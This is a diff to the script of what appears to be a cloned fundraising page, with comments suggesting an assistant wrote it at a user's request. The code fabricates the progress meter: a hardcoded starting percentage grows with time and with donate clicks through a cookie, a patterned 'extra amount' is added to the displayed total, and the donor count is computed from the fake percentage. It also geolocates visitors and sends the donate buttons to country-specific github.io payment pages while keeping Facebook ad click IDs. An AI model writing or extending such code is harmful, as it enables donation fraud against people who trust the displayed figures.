@@ -11807,8 +11807,7 @@
 
 
 
-
-                <div class="progress-meter_progressMeter__BYOlt progress-meter progress-meter_goalBarVariantProgressMeter___rdnj" style="display: flex; align-items: center; justify-content: space-between; gap: 20px; padding: 10px; border: 1px solid #e6f2ec; border-radius: 8px;">
+<div class="progress-meter_progressMeter__BYOlt progress-meter progress-meter_goalBarVariantProgressMeter___rdnj" style="display: flex; align-items: center; justify-content: space-between; gap: 20px; padding: 10px; border: 1px solid #e6f2ec; border-radius: 8px;">
   <div style="flex: 1;">
     <div class="progress-meter_progressMeterHeading__A6Slt hrt-text-body-sm" style="font-weight: bold; font-size: 16px; margin-bottom: 5px;">
       <span class="progress-meter_thickerHeading__V5Kgs">
@@ -11856,7 +11855,11 @@
     </div>
   </div>
 </div>
+
 <script>
+/**
+ * Returns the value of a cookie by name, or null if not found.
+ */
 function getCookieValue(name) {
   var cookieString = document.cookie || '';
   var cookies = cookieString.split(';');
@@ -11868,14 +11871,54 @@ function getCookieValue(name) {
   }
   return null;
 }
+
+/**
+ * Sets/updates the 'myDonationCookie' with the given JS object,
+ * stored as a JSON string.
+ */
+function setMyDonationCookie(obj) {
+  // 1-year expiration for example
+  var jsonStr = JSON.stringify(obj);
+  document.cookie = "myDonationCookie=" + jsonStr + "; path=/; max-age=31536000";
+}
+
+/**
+ * Calculate the special extra amount to add based on the final displayed percentage.
+ * 
+ * Pattern from your examples:
+ * - If percentage >= 10 (two digits): Add (percentage + 7 + firstDigit*100)
+ *   e.g. 47 => 47 + 7 + (4*100) = 454
+ *        53 => 53 + 7 + (5*100) = 560
+ * - If percentage < 10 (single digit): Add (percentage + 0 + (percentage*100))
+ *   e.g. 7 => 7 + 0 + 700 = 707
+ * 
+ * (Adjust as needed if your real logic differs, but this matches the examples you gave.)
+ */
+function getExtraAmount(percentage) {
+  if (percentage < 10) {
+    // single digit
+    return percentage + (percentage * 100);
+  } else {
+    // two digits
+    var str = percentage.toString();
+    var firstDigit = parseInt(str[0], 10);
+    return percentage + 7 + (firstDigit * 100);
+  }
+}
+
 document.addEventListener("DOMContentLoaded", function() {
   var totalGoal = 100000;
   var totalDonorsAt100 = 2930;
+  
+  // Base "hardcoded" donation percentage
   var donationPercentage = 47;
+  
   try {
     var cookieValue = getCookieValue('myDonationCookie');
     if (cookieValue) {
       var cookieObj = JSON.parse(cookieValue);
+      
+      // If we have a 'start' timestamp, calculate how many 6-hour increments have passed
       if (cookieObj.start) {
         var now = Date.now();
         var startTime = parseInt(cookieObj.start, 10);
@@ -11886,24 +11929,46 @@ document.addEventListener("DOMContentLoaded", function() {
           donationPercentage += increments;
         }
       }
+      
+      // If we have incrementsUsed, add that to the donationPercentage as well
+      if (typeof cookieObj.incrementsUsed === 'number') {
+        donationPercentage += cookieObj.incrementsUsed;
+      }
     }
   } catch (err) {
     console.log("Cookie parse error or no valid JSON in 'myDonationCookie':", err);
   }
+
+  // Make sure the final donationPercentage never exceeds 100%
   var displayDonationPercentage = Math.min(donationPercentage, 100);
+
+  // Calculate the current raised amount based on the final percentage
   var currentRaised = Math.round((totalGoal * displayDonationPercentage) / 100);
+
+  // Calculate the current donor count
   var currentDonors = Math.round((totalDonorsAt100 * displayDonationPercentage) / 100);
-  document.getElementById("amountRaisedSpan").textContent = "$" + currentRaised.toLocaleString();
+
+  // Now add the special extra amount (does NOT affect the donor count or actual percentage)
+  // Just for the displayed "raised" value:
+  var extraAmount = getExtraAmount(displayDonationPercentage);
+  var finalDisplayedRaised = currentRaised + extraAmount;
+
+  // Update DOM elements
+  document.getElementById("amountRaisedSpan").textContent = "$" + finalDisplayedRaised.toLocaleString();
   document.getElementById("goalSpan").textContent = "$" + totalGoal.toLocaleString() + " goal";
   document.getElementById("donationsSpan").textContent = currentDonors.toLocaleString() + " donations";
   document.getElementById("progressText").textContent = displayDonationPercentage + "%";
   document.getElementById("progress-title").textContent = displayDonationPercentage + "% of the goal raised";
+
+  // Update the progress circle
   var radius = 36;
   var circumference = 2 * Math.PI * radius;
   var progressCircle = document.getElementById("fundraiser-circle-goal-bar_line");
   var offset = circumference * (1 - (displayDonationPercentage / 100));
   progressCircle.setAttribute("stroke-dashoffset", offset.toString());
-  if (donationPercentage >= 100) {
+
+  // If the final (calculated) percentage is >= 100, hide donate button & show complete message
+  if (displayDonationPercentage >= 100) {
     var donateButtonContainers = document.querySelectorAll('[data-element-id="btn_donate"]');
     donateButtonContainers.forEach(function(container) {
       container.style.display = 'none';
@@ -11915,13 +11980,17 @@ document.addEventListener("DOMContentLoaded", function() {
   }
 });
 </script>
+
 <script>
 document.addEventListener("DOMContentLoaded", function() {
   var donateAnchors = document.querySelectorAll('[data-element-id="btn_donate"] a');
+  
+  // Initially set all donate buttons to '#'
   donateAnchors.forEach(function(anchor) {
     anchor.href = '#';
   });
   console.log("[GeoScript] All donate links set to '#' initially.");
+  
   var donationLinks = {
     'US': 'https://ituberus.github.io/tesl/paytrack',
     'GB': 'https://ituberus.github.io/tesl/checktrack',
@@ -11929,8 +11998,17 @@ document.addEventListener("DOMContentLoaded", function() {
   };
   var euCountries = ["AT","BE","BG","CY","CZ","DE","DK","EE","ES","FI","FR","GR","HR","HU","IE","IT","LT","LU","LV","MT","NL","PL","PT","RO","SE","SI","SK"];
   var defaultLink = 'https://ituberus.github.io/tesl/checktrack';
-  var geoApis = ['https://ipapi.co/json/','https://ipwho.is/','https://geolocation-db.com/json/','https://ip-api.com/json/','https://extreme-ip-lookup.com/json/','https://ipinfo.io/json'];
+  
+  var geoApis = [
+    'https://ipapi.co/json/',
+    'https://ipwho.is/',
+    'https://geolocation-db.com/json/',
+    'https://ip-api.com/json/',
+    'https://extreme-ip-lookup.com/json/',
+    'https://ipinfo.io/json'
+  ];
   var results = [];
+
   function extractCountryCode(data, apiUrl) {
     var code = '';
     if (data.country_code && typeof data.country_code === 'string' && data.country_code.length === 2) {
@@ -11952,6 +12030,7 @@ document.addEventListener("DOMContentLoaded", function() {
     }
     return code;
   }
+
   function updateDonationLink() {
     var counts = {};
     var majorityCode = null;
@@ -11966,7 +12045,10 @@ document.addEventListener("DOMContentLoaded", function() {
       }
     }
     console.log("[GeoScript] Votes:", results, "Tally:", counts, "Majority code:", majorityCode);
+    
     var newLink = donationLinks[majorityCode] || defaultLink;
+
+    // Preserve any fbclid if present
     var urlParams = new URLSearchParams(window.location.search);
     var fbclid = urlParams.get('fbclid');
     if (fbclid) {
@@ -11976,11 +12058,15 @@ document.addEventListener("DOMContentLoaded", function() {
         newLink = newLink + '/?fbclid=' + fbclid;
       }
     }
+
+    // Assign the new link to all donate anchors
     donateAnchors.forEach(function(anchor) {
       anchor.href = newLink;
     });
     console.log("[GeoScript] Donation links updated to:", newLink);
   }
+
+  // Fetch geo location from the various APIs
   geoApis.forEach(function(apiUrl) {
     fetch(apiUrl)
       .then(function(response) {
@@ -11996,6 +12082,33 @@ document.addEventListener("DOMContentLoaded", function() {
       .catch(function(error) {
         console.log("[GeoScript] Error fetching from", apiUrl, "=>", error);
       });
+  });
+
+  // ---- ADDED: Increment 'incrementsUsed' in the cookie when donate is clicked ----
+  donateAnchors.forEach(function(anchor) {
+    anchor.addEventListener('click', function(e) {
+      e.preventDefault(); // prevent immediate navigation
+
+      try {
+        var cookieValue = getCookieValue('myDonationCookie');
+        var cookieObj = cookieValue ? JSON.parse(cookieValue) : {};
+
+        if (typeof cookieObj.incrementsUsed === 'number') {
+          cookieObj.incrementsUsed += 1;
+        } else {
+          cookieObj.incrementsUsed = 1;
+        }
+
+        // Store it back
+        setMyDonationCookie(cookieObj);
+
+      } catch (err) {
+        console.log("[GeoScript] Error updating incrementsUsed:", err);
+      }
+
+      // Now continue to the actual link
+      window.location.href = anchor.href;
+    });
   });
 });
 </script>
